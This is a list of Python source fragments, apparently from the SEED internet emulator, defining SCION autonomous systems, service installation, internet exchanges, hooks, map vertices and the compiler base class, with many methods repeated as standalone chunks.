\"topology.json\")\n        \"\"\"\n        # Control service\n        control_services = {}\n        for name, cs in self.__control_services.items():\n            ifaces = cs.getInterfaces()\n            if len(ifaces) > 0:\n                cs_addr = f\"{ifaces[0].getAddress()}:30252\"\n                control_services[name] = { 'addr': cs_addr }\n\n        # Border routers\n        border_routers = {}\n        for router in self.getRouters():\n            rnode: ScionRouter = self.getRouter(router)\n\n            border_routers[rnode.getName()] = {\n                \"internal_addr\": f\"{rnode.getLoopbackAddress()}:30042\",\n                \"interfaces\": rnode.getScionInterfaces()\n            }\n\n        return {\n            'attributes': self.getAsAttributes(isd),\n            'isd_as': f'{isd}-{self.getAsn()}',\n            'mtu': self.__mtu,\n            'control_service': control_services,\n            'discovery_service': control_services,\n            'border_routers': border_routers,\n            'colibri_service': {},\n        }\n\n    def createControlService(self, name: str) -> Node:\n        \"\"\"!\n        @brief Create a SCION control service node.\n\n        @param name name of the new node.\n        @returns Node.\n        \"\"\"\n        assert name not in self.__control_services, 'Control service with name {} already exists.'.format(name)\n        self.__control_services[name] = Node(name, NodeRole.Host, self.getAsn())\n\n        return self.__control_services[name]\n\n    def getControlServices(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of names of SCION control services.\n\n        @returns list of routers.\n        \"\"\"\n        return list(self.__control_services.keys())\n\n    def getControlService(self, name: str) -> Node:\n        \"\"\"!\n        @brief Retrieve a control service node.\n\n        @param name name of the node.\n        @returns Node.\n        \"\"\"\n        return self.__control_services[name]\n\n    def _doCreateGraphs(self, emulator: Emulator):\n        \"\"\"!\n        @copydoc AutonomousSystem._doCreateGraphs()\n        \"\"\"\n        super()._doCreateGraphs(emulator)\n        asn = self.getAsn()\n        l2graph = self.getGraph('AS{}: Layer 2 Connections'.format(asn))\n        for obj in self.__control_services.values():\n            router: Node = obj\n            rtrname = 'CS: {}'.format(router.getName(), group = 'AS{}'.format(asn))\n            l2graph.addVertex(rtrname, group = 'AS{}'.format(asn))\n            for iface in router.getInterfaces():\n                net = iface.getNet()\n                netname = 'Network: {}'.format(net.getName())\n                l2graph.addEdge(rtrname, netname)\n            \n    def print(self, indent: int) -> str:\n        \"\"\"!\n        @copydoc AutonomousSystem.print()\n        \"\"\"\n        out = super().print(indent)\n\n        out += ' ' * indent\n        out += 'SCION Control Services:\\n'\n\n        for node in self.__control_services.values():\n            out += node.print(indent + 4)\n\n        return out",
  "def __str__(self):\n        return f\"{self.isd}-{self.asn}\"",
  "def __init__(self, asn: int, subnetTemplate: str = \"10.{}.0.0/16\"):\n        \"\"\"!\n        @copydoc AutonomousSystem\n        \"\"\"\n        super().__init__(asn, subnetTemplate)\n        self.__control_services = {}\n        self.__keys = None\n        self.__attributes = defaultdict(set)\n        self.__mtu = None\n        self.__next_ifid = 1",
  "def registerNodes(self, emulator: Emulator):\n        \"\"\"!\n        @copydoc AutonomousSystem.registerNodes()\n        \"\"\"\n        super().registerNodes(emulator)\n        reg = emulator.getRegistry()\n        asn = str(self.getAsn())\n        for (key, val) in self.__control_services.items(): reg.register(asn, 'csnode', key, val)",
  "def configure(self, emulator: Emulator):\n        \"\"\"!\n        @copydoc AutonomousSystem.configure()\n        \"\"\"\n        super().configure(emulator)\n\n        for cs in self.__control_services.values():\n            if len(cs.getNameServers()) == 0:\n                cs.setNameServers(self.getNameServers())\n            cs.configure(emulator)\n\n        # Set MTU to the smallest MTU of all AS-internal networks\n        reg = emulator.getRegistry()\n        self.__mtu = min(net.getMtu() for net in reg.getByType(str(self.getAsn()), 'net'))\n\n        # Create secret keys\n        self.__keys = (\n            base64.b64encode(os.urandom(16)).decode(),\n            base64.b64encode(os.urandom(16)).decode())",
  "def getNextIfid(self) -> int:\n        \"\"\"!\n        @brief Get next unused IFID. Called during configuration.\n        \"\"\"\n        ifid = self.__next_ifid\n        self.__next_ifid += 1\n        return ifid",
  "def getSecretKeys(self) -> Tuple[str, str]:\n        \"\"\"!\n        @brief Get AS secret keys.\n        \"\"\"\n        assert self.__keys is not None, \"AS is not configured yet\"\n        return self.__keys",
  "def setAsAttributes(self, isd: int, attributes: Iterable[str]) -> ScionAutonomousSystem:\n        \"\"\"!\n        @brief Set an AS's attributes. Called during configuration.\n\n        @param isd To which ISD the attributes apply.\n        @param attributes List of attributes. Replaces any attributes previously configured.\n        @returns self\n        \"\"\"\n        self.__attributes[isd] = set(attributes)\n        return self",
  "def getAsAttributes(self, isd: int) -> List[str]:\n        \"\"\"!\n        @brief Get all AS attributes.\n\n        @param isd To which ISD the attributes apply.\n        @returns List of attributes.\n        \"\"\"\n        return list(self.__attributes[isd])",
  "def getTopology(self, isd: int) -> Dict:\n        \"\"\"!\n        @brief Create the AS topology definition.\n\n        Called during rendering.\n\n        @param isd ISD for which to generate the AS topology.\n        @return Topology dictionary (can be serialized to \"topology.json\")\n        \"\"\"\n        # Control service\n        control_services = {}\n        for name, cs in self.__control_services.items():\n            ifaces = cs.getInterfaces()\n            if len(ifaces) > 0:\n                cs_addr = f\"{ifaces[0].getAddress()}:30252\"\n                control_services[name] = { 'addr': cs_addr }\n\n        # Border routers\n        border_routers = {}\n        for router in self.getRouters():\n            rnode: ScionRouter = self.getRouter(router)\n\n            border_routers[rnode.getName()] = {\n                \"internal_addr\": f\"{rnode.getLoopbackAddress()}:30042\",\n                \"interfaces\": rnode.getScionInterfaces()\n            }\n\n        return {\n            'attributes': self.getAsAttributes(isd),\n            'isd_as': f'{isd}-{self.getAsn()}',\n            'mtu': self.__mtu,\n            'control_service': control_services,\n            'discovery_service': control_services,\n            'border_routers': border_routers,\n            'colibri_service': {},\n        }",
  "def createControlService(self, name: str) -> Node:\n        \"\"\"!\n        @brief Create a SCION control service node.\n\n        @param name name of the new node.\n        @returns Node.\n        \"\"\"\n        assert name not in self.__control_services, 'Control service with name {} already exists.'.format(name)\n        self.__control_services[name] = Node(name, NodeRole.Host, self.getAsn())\n\n        return self.__control_services[name]",
  "def getControlServices(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of names of SCION control services.\n\n        @returns list of routers.\n        \"\"\"\n        return list(self.__control_services.keys())",
  "def getControlService(self, name: str) -> Node:\n        \"\"\"!\n        @brief Retrieve a control service node.\n\n        @param name name of the node.\n        @returns Node.\n        \"\"\"\n        return self.__control_services[name]",
  "def _doCreateGraphs(self, emulator: Emulator):\n        \"\"\"!\n        @copydoc AutonomousSystem._doCreateGraphs()\n        \"\"\"\n        super()._doCreateGraphs(emulator)\n        asn = self.getAsn()\n        l2graph = self.getGraph('AS{}: Layer 2 Connections'.format(asn))\n        for obj in self.__control_services.values():\n            router: Node = obj\n            rtrname = 'CS: {}'.format(router.getName(), group = 'AS{}'.format(asn))\n            l2graph.addVertex(rtrname, group = 'AS{}'.format(asn))\n            for iface in router.getInterfaces():\n                net = iface.getNet()\n                netname = 'Network: {}'.format(net.getName())\n                l2graph.addEdge(rtrname, netname)",
  "def print(self, indent: int) -> str:\n        \"\"\"!\n        @copydoc AutonomousSystem.print()\n        \"\"\"\n        out = super().print(indent)\n\n        out += ' ' * indent\n        out += 'SCION Control Services:\\n'\n\n        for node in self.__control_services.values():\n            out += node.print(indent + 4)\n\n        return out",
  "class Server(Printable):\n    \"\"\"!\n    @brief Server class.\n\n    The Server class is the handler for installed services.\n    \"\"\"\n    __class_names: list\n    _base_system: BaseSystem\n    def __init__(self):\n        super().__init__()\n        self.__class_names = []\n        self._base_system = BaseSystem.DEFAULT\n\n    def install(self, node: Node):\n        \"\"\"!\n        @brief Install the server on node.\n\n        @param node node.\n        \"\"\"\n        raise NotImplementedError('install not implemented')\n    \n    def setBaseSystem(self, base_system: BaseSystem) -> Server:\n        \"\"\"!\n        @brief Set a base_system of a server.\n\n        @param base_system base_system to use.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._base_system = base_system\n    \n    def getBaseSystem(self) -> BaseSystem:\n        \"\"\"!\n        @brief Get configured base system on this server.\n\n        @returns base system.\n        \"\"\"\n        return self._base_system\n\n    def getClassNames(self):\n        return self.__class_names\n    \n    def appendClassName(self, class_name:str):\n        \"\"\"!\n        @brief Append Class Name\n        The method called by User. \n\n        @param class_name class name.\n\n        @return self.\n        \"\"\"\n\n        self.__class_names.append(class_name)\n\n        return self",
  "class Service(Layer):\n    \"\"\"!\n    @brief Service base class.\n\n    The base class for all Services.\n    \"\"\"\n\n    _pending_targets: Dict[str, Server]\n    \n    __targets: Set[Tuple[Server, Node]]\n\n    def __init__(self):\n        super().__init__()\n        self._pending_targets = {}\n        self.__targets = set()\n\n    def _createServer(self) -> Server:\n        \"\"\"!\n        @brief Create a new server.\n        \"\"\"\n        raise NotImplementedError('_createServer not implemented')\n\n    def _doInstall(self, node: Node, server: Server):\n        \"\"\"!\n        @brief install the server on node. This can be overridden by service\n        implementations.\n\n        @param node node.\n        @param server server.\n        \"\"\"\n        server.install(node)\n\n    def _doSetClassNames(self, node:Node, server:Server) -> Node:\n        \"\"\"!\n        @brief set the class names on node. \n\n        @param node node.\n        @param server server.\n        \"\"\"\n        server.setClassNames(node)\n\n    def _doConfigure(self, node: Node, server: Server):\n        \"\"\"!\n        @brief configure the node. Some services may need to by configure before\n        rendered.\n\n        This is currently used by the DNS layer to configure NS and gules\n        records before the actual installation.\n        \n        @param node node\n        @param server server\n        \"\"\"\n        return\n\n    def __configureServer(self, server: Server, node: Node):\n        \"\"\"!\n        @brief Configure the service on given node.\n\n        @param node node to configure the service on.\n\n        @throws AssertionError if node is not host node.\n        \"\"\"\n        assert node.getRole() == NodeRole.Host, 'node as{}/{} is not a host node'.format(node.getAsn(), node.getName())\n        servicesdb: Dict = node.getAttribute('services', {})\n\n        for (name, service_info) in servicesdb.items():\n            service: Service = service_info['__self']\n            assert name not in self.getConflicts(), '{} conflict with {} on as{}/{}.'.format(self.getName(), service.getName(), node.getAsn(), node.getName())\n            assert self.getName() not in service.getConflicts(), '{} conflict with {} on as{}/{}.'.format(self.getName(), service.getName(), node.getAsn(), node.getName())\n\n        m_name = self.getName()\n        if m_name not in servicesdb:\n            servicesdb[m_name] = {\n                '__self': self\n            }\n\n        node.setBaseSystem(server.getBaseSystem())\n        \n        self._doConfigure(node, server)\n        self.__targets.add((server, node))\n\n    def addPrefix(self, prefix: str):\n        \"\"\"!\n        @brief add a prefix to all virtual nodes.\n\n        This method sets a prepend a prefix to all virtual node names.\n        \"\"\"\n        new_dict = {}\n        for k, v in self._pending_targets.items():\n            new_dict[prefix + k] = v\n        \n        self._pending_targets = new_dict\n\n    def install(self, vnode: str) -> Server:\n        \"\"\"!\n        @brief install the service on a node identified by given name.\n        \"\"\"\n        if vnode in self._pending_targets.keys(): return self._pending_targets[vnode]\n\n        s = self._createServer()\n        self._pending_targets[vnode] = s\n\n        return self._pending_targets[vnode]\n\n    def configure(self, emulator: Emulator):\n        for (vnode, server) in self._pending_targets.items():\n            pnode = emulator.getBindingFor(vnode)\n            self._log('looking for binding for {}...'.format(vnode))\n            self.__configureServer(server, pnode)\n            self._log('configure: bound {} to as{}/{}.'.format(vnode, pnode.getAsn(), pnode.getName()))\n    \n    def render(self, emulator: Emulator):\n        for (server, node) in self.__targets:\n            self._doInstall(node, server)\n            for className in server.getClassNames():\n                node.appendClassName(className)\n        \n    def getConflicts(self) -> List[str]:\n        \"\"\"!\n        @brief Get a list of conflicting services.\n\n        Override to change.\n\n        @return list of service names.\n        \"\"\"\n        return []\n\n    def getTargets(self) -> Set[Tuple[Server, Node]]:\n        \"\"\"!\n        @brief Get nodes and the server object associated with them. Note this\n        only work after the layer is configured.\n        \"\"\"\n        return self.__targets\n\n    def setPendingTargets(self, targets: Dict[str, Server]):\n        \"\"\"!\n        @brief Overrides the pending vnode dict. Use with caution.\n\n        @param targets new targets.\n        \"\"\"\n        self._pending_targets = targets\n\n    def getPendingTargets(self) -> Dict[str, Server]:\n        \"\"\"!\n        @brief Get a set of pending vnode to install the service on.\n        \"\"\"\n        return self._pending_targets",
  "def __init__(self):\n        super().__init__()\n        self.__class_names = []\n        self._base_system = BaseSystem.DEFAULT",
  "def install(self, node: Node):\n        \"\"\"!\n        @brief Install the server on node.\n\n        @param node node.\n        \"\"\"\n        raise NotImplementedError('install not implemented')",
  "def setBaseSystem(self, base_system: BaseSystem) -> Server:\n        \"\"\"!\n        @brief Set a base_system of a server.\n\n        @param base_system base_system to use.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._base_system = base_system",
  "def getBaseSystem(self) -> BaseSystem:\n        \"\"\"!\n        @brief Get configured base system on this server.\n\n        @returns base system.\n        \"\"\"\n        return self._base_system",
  "def getClassNames(self):\n        return self.__class_names",
  "def appendClassName(self, class_name:str):\n        \"\"\"!\n        @brief Append Class Name\n        The method called by User. \n\n        @param class_name class name.\n\n        @return self.\n        \"\"\"\n\n        self.__class_names.append(class_name)\n\n        return self",
  "def __init__(self):\n        super().__init__()\n        self._pending_targets = {}\n        self.__targets = set()",
  "def _createServer(self) -> Server:\n        \"\"\"!\n        @brief Create a new server.\n        \"\"\"\n        raise NotImplementedError('_createServer not implemented')",
  "def _doInstall(self, node: Node, server: Server):\n        \"\"\"!\n        @brief install the server on node. This can be overridden by service\n        implementations.\n\n        @param node node.\n        @param server server.\n        \"\"\"\n        server.install(node)",
  "def _doSetClassNames(self, node:Node, server:Server) -> Node:\n        \"\"\"!\n        @brief set the class names on node. \n\n        @param node node.\n        @param server server.\n        \"\"\"\n        server.setClassNames(node)",
  "def _doConfigure(self, node: Node, server: Server):\n        \"\"\"!\n        @brief configure the node. Some services may need to by configure before\n        rendered.\n\n        This is currently used by the DNS layer to configure NS and gules\n        records before the actual installation.\n        \n        @param node node\n        @param server server\n        \"\"\"\n        return",
  "def __configureServer(self, server: Server, node: Node):\n        \"\"\"!\n        @brief Configure the service on given node.\n\n        @param node node to configure the service on.\n\n        @throws AssertionError if node is not host node.\n        \"\"\"\n        assert node.getRole() == NodeRole.Host, 'node as{}/{} is not a host node'.format(node.getAsn(), node.getName())\n        servicesdb: Dict = node.getAttribute('services', {})\n\n        for (name, service_info) in servicesdb.items():\n            service: Service = service_info['__self']\n            assert name not in self.getConflicts(), '{} conflict with {} on as{}/{}.'.format(self.getName(), service.getName(), node.getAsn(), node.getName())\n            assert self.getName() not in service.getConflicts(), '{} conflict with {} on as{}/{}.'.format(self.getName(), service.getName(), node.getAsn(), node.getName())\n\n        m_name = self.getName()\n        if m_name not in servicesdb:\n            servicesdb[m_name] = {\n                '__self': self\n            }\n\n        node.setBaseSystem(server.getBaseSystem())\n        \n        self._doConfigure(node, server)\n        self.__targets.add((server, node))",
  "def addPrefix(self, prefix: str):\n        \"\"\"!\n        @brief add a prefix to all virtual nodes.\n\n        This method sets a prepend a prefix to all virtual node names.\n        \"\"\"\n        new_dict = {}\n        for k, v in self._pending_targets.items():\n            new_dict[prefix + k] = v\n        \n        self._pending_targets = new_dict",
  "def install(self, vnode: str) -> Server:\n        \"\"\"!\n        @brief install the service on a node identified by given name.\n        \"\"\"\n        if vnode in self._pending_targets.keys(): return self._pending_targets[vnode]\n\n        s = self._createServer()\n        self._pending_targets[vnode] = s\n\n        return self._pending_targets[vnode]",
  "def configure(self, emulator: Emulator):\n        for (vnode, server) in self._pending_targets.items():\n            pnode = emulator.getBindingFor(vnode)\n            self._log('looking for binding for {}...'.format(vnode))\n            self.__configureServer(server, pnode)\n            self._log('configure: bound {} to as{}/{}.'.format(vnode, pnode.getAsn(), pnode.getName()))",
  "def render(self, emulator: Emulator):\n        for (server, node) in self.__targets:\n            self._doInstall(node, server)\n            for className in server.getClassNames():\n                node.appendClassName(className)",
  "def getConflicts(self) -> List[str]:\n        \"\"\"!\n        @brief Get a list of conflicting services.\n\n        Override to change.\n\n        @return list of service names.\n        \"\"\"\n        return []",
  "def getTargets(self) -> Set[Tuple[Server, Node]]:\n        \"\"\"!\n        @brief Get nodes and the server object associated with them. Note this\n        only work after the layer is configured.\n        \"\"\"\n        return self.__targets",
  "def setPendingTargets(self, targets: Dict[str, Server]):\n        \"\"\"!\n        @brief Overrides the pending vnode dict. Use with caution.\n\n        @param targets new targets.\n        \"\"\"\n        self._pending_targets = targets",
  "def getPendingTargets(self) -> Dict[str, Server]:\n        \"\"\"!\n        @brief Get a set of pending vnode to install the service on.\n        \"\"\"\n        return self._pending_targets",
  "class Configurable(object):\n    \"\"\"!\n    @brief Configurable class.\n\n    Configurable classes are classes that need to be configure before rendering.\n    \"\"\"\n\n    def __init__(self):\n        \"\"\"!\n        @brief create a new Configurable object.\n        \"\"\"\n        super().__init__()\n\n    def configure(self, emulator: Emulator):\n        \"\"\"!\n        @brief Configure the class.\n\n        @param emulator emulator object to use.\n        \"\"\"\n        return",
  "def __init__(self):\n        \"\"\"!\n        @brief create a new Configurable object.\n        \"\"\"\n        super().__init__()",
  "def configure(self, emulator: Emulator):\n        \"\"\"!\n        @brief Configure the class.\n\n        @param emulator emulator object to use.\n        \"\"\"\n        return",
  "class RemoteAccessProvider(object):\n    \"\"\"!\n    @brief Implements logic for provide remote access to emulated network.\n    \"\"\"\n\n    def _log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n\n        @param message message.\n        \"\"\"\n        print(\"==== {}RemoteAccessProvider: {}\".format(self.getName(), message), file=stderr)\n\n    def configureRemoteAccess(self, emulator: Emulator, netObject: Network, brNode: Node, brNet: Network):\n        \"\"\"!\n        @brief configure remote access on a given network at given AS.\n\n        @param emulator emulator object reference.\n        @param netObject network object reference.\n        @param brNode reference to a service node that is not part of the\n        emulation. This node can be used to run software (like VPN server) for\n        remote access. The configureRemoteAccess method will join the\n        brNet/netObject networks. Do not join them manually on the brNode.\n        @param brNet reference to a network that is not part of the emulation.\n        This network will have access NAT to the real internet. \n        \"\"\"\n        raise NotImplementedError(\"configureRemoteAccess not implemented.\")\n\n    def getName(self) -> str:\n        \"\"\"!\n        @brief Get the name of the provider.\n\n        @returns name.\n        \"\"\"\n        raise NotImplementedError(\"getName not implemented.\")",
  "def _log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n\n        @param message message.\n        \"\"\"\n        print(\"==== {}RemoteAccessProvider: {}\".format(self.getName(), message), file=stderr)",
  "def configureRemoteAccess(self, emulator: Emulator, netObject: Network, brNode: Node, brNet: Network):\n        \"\"\"!\n        @brief configure remote access on a given network at given AS.\n\n        @param emulator emulator object reference.\n        @param netObject network object reference.\n        @param brNode reference to a service node that is not part of the\n        emulation. This node can be used to run software (like VPN server) for\n        remote access. The configureRemoteAccess method will join the\n        brNet/netObject networks. Do not join them manually on the brNode.\n        @param brNet reference to a network that is not part of the emulation.\n        This network will have access NAT to the real internet. \n        \"\"\"\n        raise NotImplementedError(\"configureRemoteAccess not implemented.\")",
  "def getName(self) -> str:\n        \"\"\"!\n        @brief Get the name of the provider.\n\n        @returns name.\n        \"\"\"\n        raise NotImplementedError(\"getName not implemented.\")",
  "class InternetExchange(Printable, Configurable):\n    \"\"\"!\n    @brief InternetExchange class.\n\n    This class represents an internet exchange.\n    \"\"\"\n\n    __id: int\n    __net: Network\n    __rs: Node\n    __name: str\n\n    def __init__(self, id: int, prefix: str = \"auto\", aac: AddressAssignmentConstraint = None):\n        \"\"\"!\n        @brief InternetExchange constructor.\n\n        @param id ID (ASN) for the IX.\n        @param prefix (optional) prefix to use as peering LAN.\n        @param aac (option) AddressAssignmentConstraint to use.\n        \"\"\"\n\n        self.__id = id\n\n        assert prefix != \"auto\" or self.__id <= 255, \"can't use auto: id > 255\"\n        network = IPv4Network(prefix) if prefix != \"auto\" else IPv4Network(\"10.{}.0.0/24\".format(self.__id))\n\n        self.__name = 'ix{}'.format(str(self.__id))\n        self.__rs = Node(self.__name, NodeRole.RouteServer, self.__id)\n        self.__net = Network(self.__name, NetworkType.InternetExchange, network, aac, False)\n\n        self.__rs.joinNetwork(self.__name)\n\n    def configure(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n\n        reg.register('ix', 'net', self.__name, self.__net)\n        reg.register('ix', 'rs', self.__name, self.__rs)\n\n        self.__rs.configure(emulator)\n\n    def getId(self) -> int:\n        \"\"\"!\n        @brief Get internet exchange ID.\n\n        @returns ID.\n        \"\"\"\n        return self.__id\n\n    def getPeeringLan(self) -> Network:\n        \"\"\"!\n        @brief Get the peering lan network for this IX.\n\n        @returns Peering network.\n        \"\"\"\n        return self.__net\n\n    def getRouteServerNode(self) -> Node:\n        \"\"\"!\n        @brief Get route server node.\n\n        @returns RS node.\n        \"\"\"\n        return self.__rs\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'InternetExchange {}:\\n'.format(self.__id)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Peering LAN Prefix: {}\\n'.format(self.__net.getPrefix())\n\n        return out",
  "def __init__(self, id: int, prefix: str = \"auto\", aac: AddressAssignmentConstraint = None):\n        \"\"\"!\n        @brief InternetExchange constructor.\n\n        @param id ID (ASN) for the IX.\n        @param prefix (optional) prefix to use as peering LAN.\n        @param aac (option) AddressAssignmentConstraint to use.\n        \"\"\"\n\n        self.__id = id\n\n        assert prefix != \"auto\" or self.__id <= 255, \"can't use auto: id > 255\"\n        network = IPv4Network(prefix) if prefix != \"auto\" else IPv4Network(\"10.{}.0.0/24\".format(self.__id))\n\n        self.__name = 'ix{}'.format(str(self.__id))\n        self.__rs = Node(self.__name, NodeRole.RouteServer, self.__id)\n        self.__net = Network(self.__name, NetworkType.InternetExchange, network, aac, False)\n\n        self.__rs.joinNetwork(self.__name)",
  "def configure(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n\n        reg.register('ix', 'net', self.__name, self.__net)\n        reg.register('ix', 'rs', self.__name, self.__rs)\n\n        self.__rs.configure(emulator)",
  "def getId(self) -> int:\n        \"\"\"!\n        @brief Get internet exchange ID.\n\n        @returns ID.\n        \"\"\"\n        return self.__id",
  "def getPeeringLan(self) -> Network:\n        \"\"\"!\n        @brief Get the peering lan network for this IX.\n\n        @returns Peering network.\n        \"\"\"\n        return self.__net",
  "def getRouteServerNode(self) -> Node:\n        \"\"\"!\n        @brief Get route server node.\n\n        @returns RS node.\n        \"\"\"\n        return self.__rs",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'InternetExchange {}:\\n'.format(self.__id)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Peering LAN Prefix: {}\\n'.format(self.__net.getPrefix())\n\n        return out",
  "class Vertex(object):\n    \"\"\"!\n    @brief a Vertex in the SEED emulator client map.\n    \"\"\"\n\n    __displayname: str\n    __description: str\n\n    def __init__(self) -> None:\n        \"\"\"!\n        @brief create a new vertex.\n        \"\"\"\n        super().__init__()\n        self.__displayname = None\n        self.__description = None\n\n    def setDisplayName(self, name: str) -> Vertex:\n        \"\"\"!\n        @brief set display name of this vertex on the map. This will be shown as\n        the label under the vertex on the map.\n\n        @param name name text, or None to clear display name\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__displayname = name\n\n        return self\n\n    def getDisplayName(self) -> str:\n        \"\"\"!\n        @brief get display name of this vertex on the map.\n\n        @returns display name, or none if unset.\n        \"\"\"\n        return self.__displayname\n\n    def setDescription(self, description: str) -> Vertex:\n        \"\"\"!\n        @brief set description of this vertex on the map. This will be shown as\n        the description at the details panel when the vertex is selected.\n\n        @param description description text, or None to clear description.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__description = description\n\n        return self\n\n    def getDescription(self) -> str:\n        \"\"\"!\n        @brief get description of this vertex on the map.\n\n        @returns description, or none if unset.\n        \"\"\"\n        return self.__description",
  "def __init__(self) -> None:\n        \"\"\"!\n        @brief create a new vertex.\n        \"\"\"\n        super().__init__()\n        self.__displayname = None\n        self.__description = None",
  "def setDisplayName(self, name: str) -> Vertex:\n        \"\"\"!\n        @brief set display name of this vertex on the map. This will be shown as\n        the label under the vertex on the map.\n\n        @param name name text, or None to clear display name\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__displayname = name\n\n        return self",
  "def getDisplayName(self) -> str:\n        \"\"\"!\n        @brief get display name of this vertex on the map.\n\n        @returns display name, or none if unset.\n        \"\"\"\n        return self.__displayname",
  "def setDescription(self, description: str) -> Vertex:\n        \"\"\"!\n        @brief set description of this vertex on the map. This will be shown as\n        the description at the details panel when the vertex is selected.\n\n        @param description description text, or None to clear description.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__description = description\n\n        return self",
  "def getDescription(self) -> str:\n        \"\"\"!\n        @brief get description of this vertex on the map.\n\n        @returns description, or none if unset.\n        \"\"\"\n        return self.__description",
  "class Printable(object):\n    \"\"\"!\n    @brief Printable class.\n\n    Implement this class for indentable print.\n    \"\"\"\n\n    def __init__(self):\n        \"\"\"!\n        @brief construct a new Printable object.\n        \"\"\"\n        super().__init__()\n\n    def print(self, indentation: int = 0) -> str:\n        \"\"\"!\n        @brief get printable string.\n\n        @param indentation indentation.\n\n        @returns printable string.\n        \"\"\"\n\n        raise NotImplementedError(\"print not implemented.\")\n\n    def __str__(self) -> str:\n        \"\"\"!\n        @brief convert to string.\n\n        alias to print(0).\n        \"\"\"\n        return self.print(0)",
  "def __init__(self):\n        \"\"\"!\n        @brief construct a new Printable object.\n        \"\"\"\n        super().__init__()",
  "def print(self, indentation: int = 0) -> str:\n        \"\"\"!\n        @brief get printable string.\n\n        @param indentation indentation.\n\n        @returns printable string.\n        \"\"\"\n\n        raise NotImplementedError(\"print not implemented.\")",
  "def __str__(self) -> str:\n        \"\"\"!\n        @brief convert to string.\n\n        alias to print(0).\n        \"\"\"\n        return self.print(0)",
  "class Hook(Registrable, Printable):\n    \"\"\"!\n    @brief Hook into the rendering process.\n    \"\"\"\n\n    def _log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n        \"\"\"\n        print(\"==== {}Hook: {}\".format(self.getName(), message), file=stderr)\n\n    def getName(self) -> str:\n        \"\"\"!\n        @brief Get the name of the hook.\n        \"\"\"\n        raise NotImplementedError(\"getName not implemented.\")\n        \n    def getTargetLayer(self) -> str:\n        \"\"\"!\n        @brief Get the name of layer to target.\n        \"\"\"\n        raise NotImplementedError(\"getTargetLayer not implemented.\")\n\n    def preconfigure(self, emulator: Emulator):\n        \"\"\"!\n        @brief pre-configure hook. This is called right before the specified is\n        about to configured.\n\n        @param emulator emulator.\n        \"\"\"\n        pass\n\n    def postconfigure(self, emulator: Emulator):\n        \"\"\"!\n        @brief post-configure hook. This is called right after the specified\n        finished configuring.\n\n        @param emulator emulator.\n        \"\"\"\n        pass\n\n    def prerender(self, emulator: Emulator):\n        \"\"\"!\n        @brief pre-render hook. This is called right before the specified is\n        about to rendered.\n\n        @param emulator emulator.\n        \"\"\"\n        pass\n\n    def postrender(self, emulator: Emulator):\n        \"\"\"!\n        @brief post-render hook. This is called right after the specified\n        finished rendering.\n\n        @param emulator emulator.\n        \"\"\"\n        pass\n\n    def print(self, indent: int) -> str:\n        return ' ' * indent + '{}Hook: targeting {}\\n'.format(self.getName(), self.getTargetLayer())",
  "def _log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n        \"\"\"\n        print(\"==== {}Hook: {}\".format(self.getName(), message), file=stderr)",
  "def getName(self) -> str:\n        \"\"\"!\n        @brief Get the name of the hook.\n        \"\"\"\n        raise NotImplementedError(\"getName not implemented.\")",
  "def getTargetLayer(self) -> str:\n        \"\"\"!\n        @brief Get the name of layer to target.\n        \"\"\"\n        raise NotImplementedError(\"getTargetLayer not implemented.\")",
  "def preconfigure(self, emulator: Emulator):\n        \"\"\"!\n        @brief pre-configure hook. This is called right before the specified is\n        about to configured.\n\n        @param emulator emulator.\n        \"\"\"\n        pass",
  "def postconfigure(self, emulator: Emulator):\n        \"\"\"!\n        @brief post-configure hook. This is called right after the specified\n        finished configuring.\n\n        @param emulator emulator.\n        \"\"\"\n        pass",
  "def prerender(self, emulator: Emulator):\n        \"\"\"!\n        @brief pre-render hook. This is called right before the specified is\n        about to rendered.\n\n        @param emulator emulator.\n        \"\"\"\n        pass",
  "def postrender(self, emulator: Emulator):\n        \"\"\"!\n        @brief post-render hook. This is called right after the specified\n        finished rendering.\n\n        @param emulator emulator.\n        \"\"\"\n        pass",
  "def print(self, indent: int) -> str:\n        return ' ' * indent + '{}Hook: targeting {}\\n'.format(self.getName(), self.getTargetLayer())",
  "class Compiler:\n    \"\"\"!\n    @brief The Compiler base class.\n\n    Compiler takes the rendered result and compiles them to working emulators.\n    \"\"\"\n\n    def _doCompile(self, emulator: Emulator):\n        \"\"\"!\n        @brief Compiler driver implementation.\n\n        This method should be implemented by the compiler driver. The driver\n        class can assume that the current working directory is the output\n        folder.\n\n        @param emulator emulator object.\n        \"\"\"\n        raise NotImplementedError('_doCompile not implemented.')\n\n    def getName(self) -> str:\n        \"\"\"!\n        @brief Get the name of compiler driver.\n\n        @returns name of the driver.\n        \"\"\"\n        raise NotImplementedError('getName not implemented.')\n\n    def compile(self, emulator: Emulator, output: str, override: bool = False):\n        \"\"\"!\n        @brief Compile the simulation.\n\n        @param emulator emulator object.\n        @param output output directory path.\n        @param override (optional) override the output folder if it already\n        exist. False by default.\n        \"\"\"\n        assert emulator.rendered(), 'Simulation needs to be rendered before compile.'\n\n        cur = getcwd()\n        if path.exists(output):\n            if override:\n                self._log('output folder \"{}\" already exist, overriding.'.format(output))\n                rmtree(output)\n            else:\n                self._log('output folder \"{}\" already exist. Set \"override = True\" when calling compile() to override.'.format(output))\n                exit(1)\n        mkdir(output)\n        chdir(output)\n        self._doCompile(emulator)\n        chdir(cur)\n\n    def _log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n\n        @param message message.\n        \"\"\"\n        print(\"== {}Compiler: {}\".format(self.getName(), message), file=stderr)",
